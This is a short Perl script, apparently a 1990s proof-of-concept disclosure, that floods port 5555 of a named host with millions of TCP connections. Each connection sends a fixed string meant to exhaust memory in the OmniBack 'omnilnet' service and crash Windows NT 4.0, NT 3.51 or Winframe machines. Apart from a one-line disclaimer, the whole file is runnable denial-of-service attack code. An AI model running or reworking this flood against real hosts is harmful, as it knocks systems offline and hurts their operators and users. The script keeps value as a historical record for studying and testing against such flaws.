#!/usr/bin/perl
#
# Jon Hittner
# Raise the memory size for omnilnet until Windows NT crashes
# Test against NT4.0 SP5 , NT3.51 , Winframe 1.7 SP5b , Winframe 1.8
# Probably needs to be run several times to crash the system depending
# on the amount of memory in the system.
# This code was written to demo a problem, and I take no respoablity on how
# it's used

use strict; use Socket;

my($y,$h,$p,$in_addr,$proto,$addr);

$h = "$ARGV[0]"; $p = 5555 if (!$ARGV[1]);
if (!$h) { print "A hostname must be provided. Ex: www.domain.com\n"; }

$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
$proto = getprotobyname('tcp');
print "TESTING: $h:$p\n";
for ($y=1 ; $y<2500000 ; $y++) {
	socket(S, AF_INET, SOCK_STREAM, $proto);
	connect(S,$addr) or next;
	select S;
	$| = 1;
	select STDOUT;
	send S,"OMNIBACK HAS SOME BIG ISSUES",0;
	}
print "ATTACK COMPLETED!\n";

